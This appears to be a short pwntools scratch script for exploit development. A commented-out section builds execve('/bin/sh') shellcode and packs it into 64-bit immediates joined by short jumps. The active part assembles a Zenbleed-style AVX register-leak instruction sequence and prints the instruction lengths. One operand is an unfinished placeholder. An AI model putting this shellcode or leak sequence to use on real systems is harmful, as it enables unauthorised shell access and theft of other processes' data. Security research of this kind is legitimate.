#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'


# def convert(x):
#     #print(len(x))
#     jmp = b'\xeb\x0c' # jmp 0xe
#     return u64(x.ljust(6, b'\x90') + jmp)


# imm = [
#     asm('push SYS_execve; pop rax'),
#     asm('push 0x0068732f; pop rbx'), # "/sh\0"
#     asm('push 0x6e69622f; pop rcx'), # "/bin"
#     asm('shl rbx, 0x20'),
#     asm('add rbx, rcx; push rbx'),
#     asm('mov rdi, rsp'),
#     asm('xor rsi, rsi; xor rdx, rdx'),
#     asm('syscall')
# ]

# imm = [convert(x) for x in imm]
# log.info(f'{imm}')



zenbleed = [
    asm('vpxor ymm0,ymm0,ymm0'),
    asm('vpcmpistri xmm0, xmm0, byte'),
    asm('vcvtsi2ss xmm0, xmm0, rax'),
    asm('vmovupd ymm0, ymm0'),
    asm('vzeroupper'),
    asm('vmovupd [rcx+0x7],ymm0'),
]

for ins in zenbleed:
    print(len(ins))